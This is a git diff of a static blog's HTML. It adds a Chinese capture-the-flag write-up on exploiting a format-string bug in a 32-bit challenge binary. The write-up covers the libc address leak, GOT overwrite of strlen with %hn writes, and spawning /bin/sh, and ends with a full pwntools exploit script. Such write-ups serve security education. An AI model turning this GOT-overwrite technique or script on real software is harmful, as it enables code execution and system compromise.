@@ -155,6 +155,124 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-title-link" itemprop="url">格式化字符串</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-18 14:48:51 / 修改时间：20:53:52" itemprop="dateCreated datePublished" datetime="2021-11-18T14:48:51+08:00">2021-11-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>这篇文章可能有一些表述存在问题。</p>
+<p>一道格式化字符串题目，程序主逻辑如下：</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/main.png" class>
+
+<p>可以看到此题不存在栈溢出，因为可利用read函数读入的字节小于 s[] 和 format[] 离ebp的距离，另外，对于此题的main函数，即便存在栈溢出显然也无法利用，因为main函数通过调用exit()来进行程序的结束而非return，既然不存在return那也就无法通过栈溢出来控制程序的执行流。 </p>
+<p>程序保护如下：</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/checksec.png" class>
+
+<p>因为RELRO只开了一半，所以got表可写。</p>
+<p>因为strlen()和printf()这两个函数会以 format 为参数，而 format 又可以间接利用read函数进行控制，所以可以先利用格式化字符串漏洞将strlen()或者printf()的got表修改为system函数的真实地址，修改后再调用strlen()或者printf()函数就相当于调用了system()，再利用read函数控制format就相当于控制了system函数的参数，从而执行system(‘/bin/sh’);</p>
+<p>综上此题的思路就明确了：利用格式化字符串漏洞将printf()函数或strlen()函数的got表修改为system函数的地址，修改完成后在下一次循环时利用read函数间接给被修改了got表的函数传参，从而getshell。</p>
+<p>明确了思路之后来思考利用格式化字符串漏洞所需要的东西：①system函数的真实地址。②printf()或strlen()函数的got表的地址。</p>
+<p>显然因为程序开启的保护有限，②可以在IDA中获得。而①就需要手动泄漏。</p>
+<p>①的泄漏方式：</p>
+<p>在gdb中将断点打在有格式化字符串漏洞的printf()函数上（这是为了观察printf()函数的栈空间）</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<p>观察到printf()函数的栈空间如下（输入了 ‘aaaa’ ）</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/stack.png" class>
+
+<p>显然可以看到光标处有一个存在于libc中的函数（__libc_start_main，括号中的 +247 表示 0xf7e1c647（即栈上存放的地址）相对于libc_start_main函数的偏移为 +247 ，所以“0xf7e1c647 - 247”就是libc_start_main函数的真实地址），我们可以选择通过利用格式化字符串漏洞来泄漏它的地址从而获得①。</p>
+<p>既然需要泄漏光标处的地址就需要知道其是相对于格式化字符串的第几个参数，我们运行程序，输入”%p”</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-2.jpg" class>
+
+<p>可以看到格式化字符串的第一个参数在 esp+4 上，那么通过计算光标处的地址与 esp+4 的偏移即可得知其是相对于格式化字符串的第151个参数（32位程序一个内存单元占4个字节，0x258 / 4 = 150）</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-3.jpg" class>
+
+<p>所以我们输入<code>%151$p</code>就可以泄漏出目标地址，前面说过，该泄漏的地址相对于__libc_strat_main()的偏移为 +247 ，所以要将该地址 -247 才是 libc_start_main()的地址。</p>
+<p>然后通过ret2libc的知识就可以得到system()的地址，此题为：0xf7db5db0。</p>
+<p>到这里我们就可以进行函数got表的修改操作，这里我们选择修改strlen()函数的got表。</p>
+<p>修改got表的操作有几个值得注意的问题：</p>
+<ol>
+<li>显然对于此题而言，必须在一次格式化字符串漏洞的利用中将整个got表修改完成，如果一次只修改部分的话，在下次调用strlen()的时候因为got表被破坏了（没有修改完成），所以会导致程序无法正常执行。</li>
+<li>不能利用一次%n将got表的4个字节全部修改，因为如果利用一次%n修改全部4个字节的话，则需要先在前面输出 ’0xf7db5db0‘ 这么多个字符，这样会导致终端崩溃，所以我们一次性最多修改两个字节，即%hn</li>
+<li>因为%n的特性，我们只能先从较小的两个字节开始修改（因为输出总是越来越多，所以%n写入的数字只能越来越大），于此题而言，我们则需要先将strlen()的got表的低位两字节修改为 ’5db0‘,然后再将高位两字节修改为 ’f7db‘。为此，我们需要将<code>elf.got[&#39;strlen&#39;]</code>以及<code>elf.got[&#39;strlen&#39;] + 2</code>作为格式化字符串的参数（为什么是<code>elf.got[&#39;strlen&#39;] + 2</code>？因为<code>elf.got[&#39;strlen&#39;] + 2</code>的低位两字节就是<code>elf.got[&#39;strlen&#39;]</code>的高位两字节）</li>
+</ol>
+<p>既然我们需要利用 %hn 来进行修改，那么就先需要利用 %c 输出对应的字符数，我们就需要分别取出system()的低位两字节和高位两字节的值作为输出的字符数，显然可以通过位运算的知识来实现，利用 <code>system_addr &amp; 0xffff</code>来取出system()地址的低位两字节，利用<code>(system_addr &gt;&gt; 16) &amp; 0xffff</code>来取出system()地址的高位两字节。</p>
+<p>同时需要注意的是，在两次修改过程中，因为第一次已经打印了<code>system_addr &amp; 0xffff</code> 这么多个字符，所以第二次需要打印的字符数为 <code>((system_addr &gt;&gt; 16) &amp; 0xffff) - (system_addr &amp; 0xffff)</code>，同时注意运算符的优先级。</p>
+<p>对于此题而言，还需要做一些小修改，这是因为我们的输入是s，而printf()的参数是format，在程序的sprintf()中，我们的输入s被进行了拼接的操作</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-4.jpg" class>
+
+<p>所以我们在计算需要输出的字符数时还要考虑这个影响，所以第一次输出的字符数应为：</p>
+<p><code>(system_addr &amp; 0xffff) - 9</code></p>
+<p>第二次需要输出的字符数为：<code>((system_addr &gt;&gt; 16) &amp; 0xffff) - (system_addr &amp; 0xffff)</code></p>
+<p>到此处，我们尝试发送我们的payload，发现栈上的数据结构如下：</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-5.jpg" class>
+
+<p>显然因为4个字节对齐的缘故，我们输入的地址在栈上被拆散了，所以我们需要对前面的数据进行补齐，使我们发送的两个地址恰好分别在一个内存单元中（找补齐数的方法还不是很懂，迟点回来补），补齐后栈空间如下：</p>
+<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%B0%83%E8%AF%95-6.jpg" class>
+
+<p>此时就可以确定我们输入的地址是相对于格式化字符串的第几个参数，这里可数出来是第15、16个。</p>
+<p>到这里为止我们就确定了修改got表的payload。</p>
+<p>最后我们需要利用read()来间接给system()传递参数，同样这里因为我们的输入被进行了拼接，所以我们不能直接输入”/bin/sh\x00”，这里就需要利用linux的拼接命令的符号 “ ；”，分号会使系统执行完分号前面的命令后再执行分号后面的命令，这样就能使得”/bin/sh\x00”被作为一个单独的命令执行。</p>
+<p>综上，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = process(&quot;./axbfmt&quot;)</span><br><span class="line">gdb.attach(p,&#x27;b *0x804870D&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;%151$p&#x27;</span><br><span class="line">p.sendlineafter(&quot;me:&quot;,payload)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">addr = int(p.recv(8),16)</span><br><span class="line">print hex(addr)</span><br><span class="line"></span><br><span class="line">offset = 0x22769</span><br><span class="line">elf = ELF(&quot;./axbfmt&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">lsm = libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line"></span><br><span class="line">system_addr = addr + offset</span><br><span class="line">print hex(system_addr)</span><br><span class="line"></span><br><span class="line">payload = &#x27;%&#x27; + str((system_addr &amp; 0xffff) -9)+&#x27;c%15$hn&#x27;</span><br><span class="line">payload += &#x27;%&#x27; + str(((system_addr &gt;&gt; 16) &amp; 0xffff) - (system_addr &amp; 0xffff)) + &#x27;c%16$hn&#x27;</span><br><span class="line">payload = payload.ljust(0x21,&quot;\x00&quot;)</span><br><span class="line">payload += p32(elf.got[&#x27;strlen&#x27;])</span><br><span class="line">payload += p32(elf.got[&#x27;strlen&#x27;] + 2)</span><br><span class="line">p.sendlineafter(&quot;me:&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;me:&quot;,&quot;;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/08/Canary%E7%BB%95%E8%BF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -695,14 +813,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
